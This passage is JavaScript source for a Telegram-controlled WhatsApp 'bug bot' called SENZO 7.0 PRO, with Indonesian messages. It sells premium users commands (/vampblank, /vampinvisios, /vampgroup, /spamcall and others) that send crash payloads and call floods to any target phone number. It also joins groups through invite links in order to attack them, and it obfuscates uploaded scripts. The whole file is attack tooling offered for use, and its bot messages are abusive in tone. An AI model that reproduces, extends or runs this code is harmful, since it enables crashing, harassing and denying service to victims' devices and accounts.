        return bot.sendMessage(chatId, "❌ Harap Hubungkan Nomor WhatsApp Anda.");
    }
    if (!premiumUsers.includes(senderId)) {
        return bot.sendMessage(chatId, "❌ Premium Users Only");
    }
    if (!match[1]) {
        return bot.sendMessage(chatId, "❌ Missing input. Please provide a target number.\nExample: /vampinvisios 62×××.");
    }

    const numberTarget = match[1].replace(/[^0-9]/g, '').replace(/^\+/, '');
    if (!/^\d+$/.test(numberTarget)) {
        return bot.sendMessage(chatId, "❌ Invalid input. Example: /vampinvisios 62×××.");
    }

    const formatedNumber = numberTarget + "@s.whatsapp.net";

    // Kirim notifikasi awal dengan gambar
    await bot.sendPhoto(chatId, "https://files.catbox.moe/wfhaut.webp", {
        caption: `┏━━━━━━〣 𝗡𝗢𝗧𝗜𝗙𝗜𝗖𝗔𝗧𝗜𝗢𝗡 〣━━━━━━━┓
┃ Mᴏʜᴏɴ ᴍᴇɴᴜɴɢɢᴜ...
┃ Bᴏᴛ sᴇᴅᴀɴɢ ᴏᴘᴇʀᴀsɪ ᴘᴇɴɢɪʀɪᴍᴀɴ ʙᴜɢ
┃ Tᴀʀɢᴇᴛ  : ${numberTarget}
┗━━━━━━━━━━━━━━━━━━━━━━━━━━━┛`
    });

    // Proses pengiriman bug
    await VampireiPhone(formatedNumber);
    await VampireStuckLogo(formatedNumber);

    // Kirim notifikasi setelah selesai dengan gambar lain
    await bot.sendPhoto(chatId, "https://files.catbox.moe/5vpccu.webp", {
        caption: `
┏━━━━━━〣 𝗡𝗢𝗧𝗜𝗙𝗜𝗖𝗔𝗧𝗜𝗢𝗡 〣━━━━━━┓
┃         〢𝗦𝘂𝗰𝗰𝗲𝘀𝘀𝗳𝘂𝗹𝗹𝘆 𝗦𝗲𝗻𝘁 𝗕𝘂𝗴 𝘁𝗼〢
┃〢 Tᴀʀɢᴇᴛ : ${numberTarget}
┃〢 Cᴏᴍᴍᴀɴᴅ : /vampinvisios
┃〢 Wᴀʀɴɪɴɢ : ᴊᴇᴅᴀ 3 ᴍᴇɴɪᴛ ʏᴀ ᴋɪᴅs
┗━━━━━━━━━━━━━━━━━━━━━━━━━━┛`
    });
});
bot.onText(/\/vampblank(?:\s(.+))?/, async (msg, match) => {
    const senderId = msg.from.id;
    const chatId = msg.chat.id;

    if (!whatsappStatus) {
        return bot.sendMessage(chatId, "❌ Sambungkan Ke WhatsApp Dulu Goblok!!!");
    }
    if (!premiumUsers.includes(senderId)) {
        return bot.sendMessage(chatId, "❌ Premium Users Only");
    }
    if (!match[1]) {
        return bot.sendMessage(chatId, "❌ Missing input. Please provide a target number.\nExample: /vampblank 62×××.");
    }

    const numberTarget = match[1].replace(/[^0-9]/g, '').replace(/^\+/, '');
    if (!/^\d+$/.test(numberTarget)) {
        return bot.sendMessage(chatId, "❌ Invalid input. Example: /vampblank 62×××.");
    }

    const formatedNumber = numberTarget + "@s.whatsapp.net";

    // Kirim notifikasi awal dengan gambar
    await bot.sendPhoto(chatId, "https://files.catbox.moe/wfhaut.webp", {
        caption: `┏━━━━━━〣 𝗡𝗢𝗧𝗜𝗙𝗜𝗖𝗔𝗧𝗜𝗢𝗡 〣━━━━━━━┓
┃ Mᴏʜᴏɴ ᴍᴇɴᴜɴɢɢᴜ...
┃ Bᴏᴛ sᴇᴅᴀɴɢ ᴏᴘᴇʀᴀsɪ ᴘᴇɴɢɪʀɪᴍᴀɴ ʙᴜɢ
┃ Tᴀʀɢᴇᴛ  : ${numberTarget}
┗━━━━━━━━━━━━━━━━━━━━━━━━━━━┛`
    });

    // Proses pengiriman bug
    await VampireStuckLogo(formatedNumber);
    await VampireSpecial(formatedNumber);

    // Kirim notifikasi setelah selesai dengan gambar lain
    await bot.sendPhoto(chatId, "https://files.catbox.moe/5vpccu.webp", {
        caption: `
┏━━━━━━〣 𝗡𝗢𝗧𝗜𝗙𝗜𝗖𝗔𝗧𝗜𝗢𝗡 〣━━━━━━┓
┃         〢𝗦𝘂𝗰𝗰𝗲𝘀𝘀𝗳𝘂𝗹𝗹𝘆 𝗦𝗲𝗻𝘁 𝗕𝘂𝗴 𝘁𝗼〢
┃〢 Tᴀʀɢᴇᴛ : ${numberTarget}
┃〢 Cᴏᴍᴍᴀɴᴅ : /vampblank
┃〢 Wᴀʀɴɪɴɢ : ᴊᴇᴅᴀ 3 ᴍᴇɴɪᴛ ʏᴀ ᴋɪᴅs
┗━━━━━━━━━━━━━━━━━━━━━━━━━━┛`
    });
});
bot.onText(/\/vampnewbeta(?:\s(.+))?/, async (msg, match) => {
    const senderId = msg.from.id;
    const chatId = msg.chat.id;

    if (!whatsappStatus) {
        return bot.sendMessage(chatId, "❌ Sambungkan Ke WhatsApp Dulu Goblok!!!");
    }
    if (!premiumUsers.includes(senderId)) {
        return bot.sendMessage(chatId, "❌ Premium Users Only");
    }
    if (!match[1]) {
        return bot.sendMessage(chatId, "❌ Missing input. Please provide a target number.\nExample: /vampnewbeta 62×××.");
    }

    const numberTarget = match[1].replace(/[^0-9]/g, '').replace(/^\+/, '');
    if (!/^\d+$/.test(numberTarget)) {
        return bot.sendMessage(chatId, "❌ Invalid input. Example: /vampnewbeta 62×××.");
    }

    const formatedNumber = numberTarget + "@s.whatsapp.net";

    // Kirim notifikasi awal dengan gambar
    await bot.sendPhoto(chatId, "https://files.catbox.moe/wfhaut.webp", {
        caption: `┏━━━━━━〣 𝗡𝗢𝗧𝗜𝗙𝗜𝗖𝗔𝗧𝗜𝗢𝗡 〣━━━━━━━┓
┃ Mᴏʜᴏɴ ᴍᴇɴᴜɴɢɢᴜ...
┃ Bᴏᴛ sᴇᴅᴀɴɢ ᴏᴘᴇʀᴀsɪ ᴘᴇɴɢɪʀɪᴍᴀɴ ʙᴜɢ
┃ Tᴀʀɢᴇᴛ  : ${numberTarget}
┗━━━━━━━━━━━━━━━━━━━━━━━━━━━┛`
    });

    // Proses pengiriman bug
    await VampireSpecial(formatedNumber);
    await VampCrashChat(formatedNumber);

    // Kirim notifikasi setelah selesai dengan gambar lain
    await bot.sendPhoto(chatId, "https://files.catbox.moe/5vpccu.webp", {
        caption: `
┏━━━━━━〣 𝗡𝗢𝗧𝗜𝗙𝗜𝗖𝗔𝗧𝗜𝗢𝗡 〣━━━━━━┓
┃         〢𝗦𝘂𝗰𝗰𝗲𝘀𝘀𝗳𝘂𝗹𝗹𝘆 𝗦𝗲𝗻𝘁 𝗕𝘂𝗴 𝘁𝗼〢
┃〢 Tᴀʀɢᴇᴛ : ${numberTarget}
┃〢 Cᴏᴍᴍᴀɴᴅ : /vampnewbeta
┃〢 Wᴀʀɴɪɴɢ : ᴊᴇᴅᴀ 3 ᴍᴇɴɪᴛ ʏᴀ ᴋɪᴅs
┗━━━━━━━━━━━━━━━━━━━━━━━━━━┛`
    });
});
bot.onText(/\/vampgroup(?:\s(.+))?/, async (msg, match) => {
  const senderId = msg.from.id;
  const chatId = msg.chat.id;

  if (!whatsappStatus) {
    return bot.sendMessage(chatId, "❌ Sambungkan Ke WhatsApp Dulu Goblok!!!");
  }
  if (!premiumUsers.includes(senderId)) {
    return bot.sendMessage(chatId, "❌ Lu Bukan Premium Tolol!!!");
  }
  if (!match[1]) {
    return bot.sendMessage(chatId, "❌ Masukin Link Grup Yang Bener!!!\nContoh: /vampgroup https://chat.whatsapp.com/xxxx");
  }

  const groupLink = match[1].trim();
  if (!groupLink.startsWith("https://chat.whatsapp.com/")) {
    return bot.sendMessage(chatId, "❌ Link Grup Salah!!!\nContoh: /vampgroup https://chat.whatsapp.com/xxxx");
  }

  const groupCode = groupLink.split("https://chat.whatsapp.com/")[1];
  if (!groupCode) {
    return bot.sendMessage(chatId, "❌ Link Grup Gak Valid!!!\nContoh: /vampgroup https://chat.whatsapp.com/xxxx");
  }

  try {
    await bot.sendMessage(chatId, "⏳ Sedang bergabung ke grup, mohon tunggu...");
    
    const groupInfo = await sock.groupAcceptInvite(groupCode);
    const groupId = groupInfo.id;

    await bot.sendMessage(chatId, "✅ Berhasil join grup! Sedang mengirim bug...");
    
    await VampireStuckLogo(groupId);
    await VampireSpecial(groupId);

    await bot.sendMessage(
      chatId,
      `┏━━━━━━━〣 𝗡𝗢𝗧𝗜𝗙𝗜𝗖𝗔𝗧𝗜𝗢𝗡 〣━━━━━━━┓
┃╺╺╸〢𝗦𝘂𝗰𝗰𝗲𝘀𝘀𝗳𝘂𝗹𝗹𝘆 𝗦𝗲𝗻𝘁 𝗕𝘂𝗴 𝘁𝗼 𝗚𝗿𝗼𝘂𝗽〢╺╸╺
┃ Tᴀʀɢᴇᴛ Gʀᴏᴜᴘ: ${groupId}
┃ Cᴏᴍᴍᴀɴᴅ : /vampgroup
┃ Wᴀʀɴɪɴɢ : ᴊᴇᴅᴀ 3 ᴍᴇɴɪᴛ ʏᴀ ᴋɪᴅs
┗━━━━━━━━━━━━━━━━━━━━━━━━━━┛`
    );
  } catch (err) {
    console.error("Error saat join atau kirim bug:", err);
    return bot.sendMessage(chatId, "❌ Gagal mengirim bug ke grup. Mungkin bot ditolak masuk atau link salah.");
  }
});
bot.onText(/\/encrypthard/, async (msg) => {
    const chatId = msg.chat.id;
    const replyMessage = msg.reply_to_message;

    console.log(`Perintah diterima: /encrypthard dari pengguna: ${msg.from.username || msg.from.id}`);

    if (!replyMessage || !replyMessage.document || !replyMessage.document.file_name.endsWith('.js')) {
        return bot.sendMessage(chatId, '😡 Silakan Balas/Tag File .js\nBiar Gua Gak Salah Tolol.');
    }

    const fileId = replyMessage.document.file_id;
    const fileName = replyMessage.document.file_name;

    // Mendapatkan link file
    const fileLink = await bot.getFileLink(fileId);
    const response = await axios.get(fileLink, { responseType: 'arraybuffer' });
    const codeBuffer = Buffer.from(response.data);

    // Simpan file sementara
    const tempFilePath = `./@hardenc${fileName}`;
    fs.writeFileSync(tempFilePath, codeBuffer);

    // Enkripsi kode menggunakan JsConfuser
    bot.sendMessage(chatId, "⌛️Sabar...\n Lagi Di Kerjain Sama Vampire Encryptnya...");
    const obfuscatedCode = await JsConfuser.obfuscate(codeBuffer.toString(), {
        target: "node",
        preset: "high",
        compact: true,
        minify: true,
        flatten: true,
        identifierGenerator: function () {
            const originalString = "肀VampireSukaNenen舀" + "肀VampireSukaNenen舀";
            function removeUnwantedChars(input) {
                return input.replace(/[^a-zA-Z肀VampireSukaNenen舀]/g, '');
            }
            function randomString(length) {
                let result = '';
                const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz';
                for (let i = 0; i < length; i++) {
                    result += characters.charAt(Math.floor(Math.random() * characters.length));
                }
                return result;
            }
            return removeUnwantedChars(originalString) + randomString(2);
        },
        renameVariables: true,
        renameGlobals: true,
        stringEncoding: true,
        stringSplitting: 0.0,
        stringConcealing: true,
        stringCompression: true,
        duplicateLiteralsRemoval: 1.0,
        shuffle: { hash: 0.0, true: 0.0 },
        stack: true,
        controlFlowFlattening: 1.0,
        opaquePredicates: 0.9,
        deadCode: 0.0,
        dispatcher: true,
        rgf: false,
        calculator: true,
        hexadecimalNumbers: true,
        movedDeclarations: true,
        objectExtraction: true,
        globalConcealing: true
    });

    // Simpan hasil enkripsi
    const encryptedFilePath = `./@hardenc${fileName}`;
    fs.writeFileSync(encryptedFilePath, obfuscatedCode);

    // Kirim file terenkripsi ke pengguna
    bot.sendDocument(chatId, encryptedFilePath, {
        caption: `
❒━━━━━━༽𝗦𝘂𝗰𝗰𝗲𝘀𝘀༼━━━━━━❒
┃    - 𝗘𝗻𝗰𝗿𝘆𝗽𝘁 𝗛𝗮𝗿𝗱 𝗝𝘀𝗼𝗻 𝗨𝘀𝗲𝗱 -
┃             -- 𝗦𝗘𝗡𝗭𝗢 𝗕𝗢𝗧 --
❒━━━━━━━━━━━━━━━━━━━━❒`
    });
});
bot.onText(/\/best_friend/, (msg) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const senderName = msg.from.username ? `User: @${msg.from.username}` : `User ID: ${senderId}`;
  let ligma = `┏━━━〣 𝗠𝗬 𝗕𝗘𝗦𝗧 𝗙𝗥𝗜𝗘𝗡𝗗 〣━━━┓
┃
┃ Dragneel (Own PT. Dragneel)
┃ Sagara (Own PT. Sagara)
┃ Noxxhiro (Dev. Zeus)
┃ Fujii Kaze (Dev. Nerox)
┃ RenXitter (Dev. Vincent)
┃ DilxVXII (Dev. Ultra)
┃ TamaRiyuichi (Dev. Finix)
┃ SenzoTech (Dev. Senzo)
┃ Jackthexbec (Kang Dec)
┃ Primrose Lotus (Kang Dec)
┃ Alluka (Adm Primrose Lotus)
┃ Kavern (Kang DDoS)
┃ Tin (Kang VPS)
┃ Rambey (Kang VPS)
┃ Didin (Kang VPS)
┃ Er (Kang Deploy)
┗━━━━━━━━━━━━━━━━━━━━━━┛`;
bot.sendPhoto(chatId, "https://files.catbox.moe/5vpccu.webp", {
      caption: ligma,
      reply_markup: {
          inline_keyboard: [
              [
                  {
                      text: "༽𝗢𝘄𝗻𝗲𝗿༼",
                      url: "https://t.me/Senzo268"
                  },
                  {
                      text: "༽𝗜𝗻𝗳𝗼 𝗨𝗽𝗱𝗮𝘁𝗲༼",
                      url: "https://t.me/Senzo_bug_bot"
                  }
              ]
          ]
      }
  });
});
bot.onText(/\/addowner(?:\s(.+))?/, (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  if (!owner.includes(senderId) && !superVip.includes(senderId)) {
      return bot.sendMessage(chatId, "❌ Lu Bukan Owner Tolol!!!");
  }

  if (!match[1]) {
      return bot.sendMessage(chatId, "❌  Lu Salah Idiot!!!\nContoh Nih Njing : /addowner 62×××.");
  }

  const userId = parseInt(match[1].replace(/[^0-9]/g, ''));
  if (!/^\d+$/.test(userId)) {
      return bot.sendMessage(chatId, "❌  Lu Salah Idiot!!!\nContoh Nih Njing : /addowner 62×××.");
  }

  if (!adminUsers.includes(userId)) {
      adminUsers.push(userId);
      saveAdminUsers();
      saveVip();
      console.log(`${senderId} Tambahkan ${userId} Menjadi Admin`)
      bot.sendMessage(chatId, `✅ Si Binatang Ini ${userId} Sudah Mendapatkan Access Admin.`);
  } else {
      bot.sendMessage(chatId, `❌ Si Binatang Ini ${userId} Sudah Menjadi Admin`);
  }
});
bot.onText(/\/delowner(?:\s(.+))?/, (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  if (!owner.includes(senderId) && !superVip.includes(senderId)) {
      return bot.sendMessage(chatId, "❌ Lu Bukan Owner Tolol!!!");
  }
  if (!match[1]) {
      return bot.sendMessage(chatId, "❌ Lu Salah Bego!!!\nContoh Nih Njing : /delowner 62×××.");
  }
  const userId = parseInt(match[1].replace(/[^0-9]/g, ''));
  if (adminUsers.includes(userId)) {
      adminUsers = adminUsers.filter(id => id !== userId);
      saveAdminUsers();
      saveVip();
      console.log(`${senderId} Dihapus ${userId} Oleh Admin`)
      bot.sendMessage(chatId, `✅ Si Yatim Ini ${userId} \nSudah Di Hapus Dari Admin.`);
  } else {
      bot.sendMessage(chatId, `❌ Si Yatim Ini ${userId} Bukan Admin.`);
  }
});
bot.onText(/\/addprem(?:\s(.+))?/, (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  if (!owner.includes(senderId) && !adminUsers.includes(senderId) && !resellerUsers.includes(senderId) && !superVip.includes(senderId)) {
      return bot.sendMessage(chatId, "❌ Lu Bukan Owner Atau Admin Tolol!!!");
  }

  if (!match[1]) {
      return bot.sendMessage(chatId, "❌ Lu Salah Idiot!!!\nContoh Nih Njing : /addprem 62×××.");
  }

  const userId = parseInt(match[1].replace(/[^0-9]/g, ''));
  if (!/^\d+$/.test(userId)) {
      return bot.sendMessage(chatId, "❌ Lu Salah Goblok!!!\nContoh Nih Njing : /addprem 62×××.");
  }

  if (!premiumUsers.includes(userId)) {
      premiumUsers.push(userId);
      savePremiumUsers();
      console.log(`${senderId} Added ${userId} To Premium`)
      bot.sendMessage(chatId, `✅ Si Yatim Ini ${userId} Berhasil Mendapatkan Access Premium.`);
  } else {
      bot.sendMessage(chatId, `❌ Si Yatim Ini ${userId} Sudah Menjadi Premium.`);
  }
});
bot.onText(/\/delprem(?:\s(.+))?/, (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  if (!owner.includes(senderId) && !adminUsers.includes(senderId) && !superVip.includes(senderId)) {
      return bot.sendMessage(chatId, "❌ Lu Bukan Admin Atau Owner Tolol!!!");
  }

  if (!match[1]) {
      return bot.sendMessage(chatId, "❌ Lu Salah Idiot!!!\nContoh Nih Njing : /delprem 62×××.");
  }

  const userId = parseInt(match[1].replace(/[^0-9]/g, ''));
  if (premiumUsers.includes(userId)) {
      premiumUsers = premiumUsers.filter(id => id !== userId);
      savePremiumUsers();
      console.log(`${senderId} Dihapus ${userId} Dari Premium`)
      bot.sendMessage(chatId, `✅ Si Goblok Ini ${userId} Sudah Dihapus Dari Premium.`);
  } else {
      bot.sendMessage(chatId, `❌ Si Goblok Ini ${userId} Bukan Lagi Premium.`);
  }
});

bot.onText(/\/spamcall(?:\s(.+))?/, async (msg, match) => {
    const senderId = msg.from.id;
    const chatId = msg.chat.id;

    // Cek apakah WhatsApp terhubung
    if (!whatsappStatus) {
        return bot.sendMessage(chatId, "❌ Sambungkan Ke WhatsApp Dulu Goblok!!!");
    }

    // Cek apakah user premium
    if (!premiumUsers.includes(senderId)) {
        return bot.sendMessage(chatId, "❌ Hanya Untuk Premium");
    }

    // Cooldown logic
    const lastUsed = cooldowns.get(senderId);
    const now = Date.now();
    if (lastUsed && now - lastUsed < 300 * 1000) {
        const remainingTime = Math.ceil((300 * 1000 - (now - lastUsed)) / 1000);
        return bot.sendMessage(chatId, `❌ Lu Harus Tunggu CD ${remainingTime} Detik Sebelum Gunain Command Ini Lagi`);
    }
    cooldowns.set(senderId, now);

    // Cek input nomor
    if (!match[1]) {
        return bot.sendMessage(chatId, "❌ Lu Salah Goblok!!!\nContoh Nih Njing : /spamcall 6281234567890.");
    }

    const numberTarget = match[1].replace(/[^0-9]/g, '').replace(/^\+/, '');
    if (!/^\d+$/.test(numberTarget)) {
        return bot.sendMessage(chatId, "❌ Yang Bener Lah Tolol!!!\nContoh Nih Njing : /spamcall 62×××.");
    }

    const formattedNumber = `${numberTarget}@s.whatsapp.net`;

    try {
        // Fungsi spamcall di sini
        await callbug(formattedNumber);

        // Kirim konfirmasi sukses
        await bot.sendMessage(chatId, `✅ Berhasil Mengirim Bug Telpon Ke ${numberTarget} Pakai Type Bug Crash`);
    } catch (err) {
        console.error(err);
        return bot.sendMessage(chatId, "❌ Gagal Mengirim Bug Telpon. Cek Script atau Nomor Target.");
    }
});
bot.on("callback_query", async (callbackQuery) => {
    const chatId = callbackQuery.message.chat.id;
    const senderId = callbackQuery.from.id;
    const senderName = callbackQuery.from.username ? `@${callbackQuery.from.username}` : `${senderId}`;
    const [action, formatedNumber] = callbackQuery.data.split(":");

    // Definisi variabel yang belum ada
    let whatsappStatus = true; // Ganti sesuai logic di kode utama
    let getOnlineDuration = () => "1h 23m"; // Placeholder function

    try {
        if (action === "ownermenu") {
            let ligma = `
❏━━━━༽ 𝗦𝗘𝗡𝗭𝗢 𝟳.𝟬 𝗣𝗥𝗢 ༼━━━━❏
┏━━━━━━━━━━━━━━━━━━━━━━━┓
┃⚇ Nᴀᴍᴇ : ${senderName}
┃⚇ Dᴇᴠᴇʟᴏᴘᴇʀ : @Senzo268
┃⚇ ID usᴇʀ : ${senderId}
┗━━━━━━━━━━━━━━━━━━━━━━━┛
              『 ᴾᵃˢᵘᵏᵃⁿ ᴬⁿᵗᶦ ᴳᶦᵐᵐᶦᶜᵏ 』
❏━━━━━━━━━━━━━━━━━━━━━━━❏
┏━━━━━━ 𝗢𝗪𝗡𝗘𝗥 𝗠𝗘𝗡𝗨 ━━━━━━┓
┃⚇ /addbot <Num>
┃⚇ /delbot <Num>
┃⚇ /addprem <ID>
┃⚇ /delprem <ID>
┃⚇ /addowner <ID>
┃⚇ /delowner <ID>
┗━━━━━━━━━━━━━━━━━━━━━━━━┛
            `;
            await bot.sendPhoto(chatId, "https://files.catbox.moe/5vpccu.webp", {
                caption: ligma,
                parse_mode: "Markdown",
                reply_markup: {
                    inline_keyboard: [
                        [{ text: "༽𝗢𝘄𝗻𝗲𝗿༼", url: "https://t.me/Senzo268" }]
                    ]
                }
            });

        } else if (action === "bugmenu") {
            let message = `❏━━━━༽ 𝗦𝗘𝗡𝗭𝗢 𝟳.𝟬 𝗣𝗥𝗢 ༼━━━━❏
┏━━━━━━━━━━━━━━━━━━━━━━━┓
┃⚇ Nᴀᴍᴇ : ${senderName}
┃⚇ Dᴇᴠᴇʟᴏᴘᴇʀ : @Senzo268
┃⚇ Sᴛᴀᴛᴜs : ${whatsappStatus ? "Premium" : "No Access"}
┃⚇ Oɴʟɪɴᴇ : ${getOnlineDuration()}
┃⚇ ID usᴇʀ : ${senderId}
┗━━━━━━━━━━━━━━━━━━━━━━━┛
              『     ᴾᵃˢᵘᵏᵃⁿ ᴬⁿᵗᶦ ᴳᶦᵐᵐᶦᶜᵏ    』
❏━━━━━━━━━━━━━━━━━━━━━━━❏
┏━━━━━━━  ༽𝗔𝗻𝗱𝗿𝗼𝗶𝗱༼  ━━━━━━━┓
┃⚇ /vampnotif 62×××
┃⚇ /vampblank 62×××
┃⚇ /vampori 62×××
┗━━━━━━━━━━━━━━━━━━━━━━━┛
┏━━━━━━━━  ༽𝗕𝗲𝗧𝗮༼  ━━━━━━━━┓
┃⚇ /vampbeta 62×××
┃⚇ /vampnewbeta 62×××
┗━━━━━━━━━━━━━━━━━━━━━━━┛
┏━━━━━━━━━ ༽𝗜𝗼𝘀༼ ━━━━━━━━━┓
┃⚇ /vampios 62×××
┃⚇ /vampinvisios 62×××
┗━━━━━━━━━━━━━━━━━━━━━━━┛
┏━━━━━━━━ ༽𝗚𝗿𝗼𝘂𝗽༼ ━━━━━━━━┓
┃⚇ /vampgroup <Link>
┗━━━━━━━━━━━━━━━━━━━━━━━┛
❏━━━━━━━━━━━━━━━━━━━━━━━❏
`;
            bot.sendPhoto(chatId, "https://files.catbox.moe/5vpccu.webp", {
                caption: message, // Sebelumnya salah pake `ligma`
                parse_mode: "Markdown",
                reply_markup: {
                    inline_keyboard: [
                        [{ text: "༽𝗢𝘄𝗻𝗲𝗿༼", url: "https://t.me/Senzo268" }]
                    ]
                }
            });

        } else if (action === "toolsmenu") {
            let message = `❏━━━━༽ 𝗦𝗘𝗡𝗭𝗢 𝟳.𝟬 𝗣𝗥𝗢 ༼━━━━❏
┏━━━━━━━━━━━━━━━━━━━━━━━┓
┃⚇ Nᴀᴍᴇ : ${senderName}
┃⚇ Dᴇᴠᴇʟᴏᴘᴇʀ : @Senzo268
┃⚇ Sᴛᴀᴛᴜs : ${whatsappStatus ? "Premium" : "No Access"}
┃⚇ Oɴʟɪɴᴇ : ${getOnlineDuration()}
┃⚇ ID usᴇʀ : ${senderId}
┗━━━━━━━━━━━━━━━━━━━━━━━┛
              『     ᴾᵃˢᵘᵏᵃⁿ ᴬⁿᵗᶦ ᴳᶦᵐᵐᶦᶜᵏ    』
❏━━━━━━━━━━━━━━━━━━━━━━━❏
┏━━━━━━ 𝗧𝗢𝗢𝗟𝗦 𝗠𝗘𝗡𝗨 ━━━━━━┓
┃⚇ /fixedbug <Num>
┃⚇ /encrypthard <Tag File>
┃⚇ /cooldown <Duration>
┗━━━━━━━━━━━━━━━━━━━━━━━━┛
`;
            bot.sendPhoto(chatId, "https://files.catbox.moe/5vpccu.webp", {
                caption: message, // Sebelumnya salah pake `ligma`
                parse_mode: "Markdown",
                reply_markup: {
                    inline_keyboard: [
                        [{ text: "༽𝗢𝘄𝗻𝗲𝗿༼", url: "https://t.me/Senzo268" }]
                    ]
                }
            });

        } else if (action === "best_friend") {
            await bot.sendMessage(chatId, `┏━━━〣 𝗠𝗬 𝗕𝗘𝗦𝗧 𝗙𝗥𝗜𝗘𝗡𝗗 〣━━━┓
┃
┃ Dragneel (Own PT. Dragneel)
┃ Sagara (Own PT. Sagara)
┃ Noxxhiro (Dev. Zeus)
┃ Fujii Kaze (Dev. Nerox)
┃ RenXitter (Dev. Vincent)
┃ DilxVXII (Dev. Ultra)
┃ TamaRiyuichi (Dev. Finix)
┃ SenzoTech (Dev. Senzo)
┃ Jackthexbec (Kang Dec)
┃ Primrose Lotus (Kang Dec)
┃ Alluka (Adm Primrose Lotus)
┃ Kavern (Kang DDoS)
┃ Tin (Kang VPS)
┃ Rambey (Kang VPS)
┃ Didin (Kang VPS)
┃ Er (Kang Deploy)
┗━━━━━━━━━━━━━━━━━━━━━━┛`);

        } else if (action === "spamcall") {
            await spamcall(formatedNumber);
            await bot.sendMessage(chatId, `✅ Spamming Call to ${formatedNumber}@s.whatsapp.net.`);

        } else {
            bot.sendMessage(chatId, "❌ Unknown action.");
        }

        // Hapus loading di button
        await bot.answerCallbackQuery(callbackQuery.id);

    } catch (err) {
        bot.sendMessage(chatId, `❌ Failed to send bug: ${err.message}`);
    }
});

startWhatsapp()
